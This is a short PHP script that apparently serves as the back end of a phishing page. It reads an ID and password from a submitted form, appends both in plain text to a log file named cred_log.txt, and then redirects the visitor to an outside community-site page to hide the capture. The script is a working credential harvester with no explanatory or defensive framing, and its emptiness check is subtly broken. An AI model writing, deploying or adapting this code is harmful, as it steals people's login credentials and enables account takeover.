<?php


$id_value = $_POST['id'];
$pw_value = $_POST['pw'];


if (!empty(id_value)) {
  $file = fopen('cred_log.txt', 'a+');
  fwrite($file, "[2] ID : " . $id_value . " / PW : " . $pw_value . "\n");
  fclose($file);
  header('Location:https://tgd.kr/s/rlawnsvy7/51983182?favo=1');
}

?>
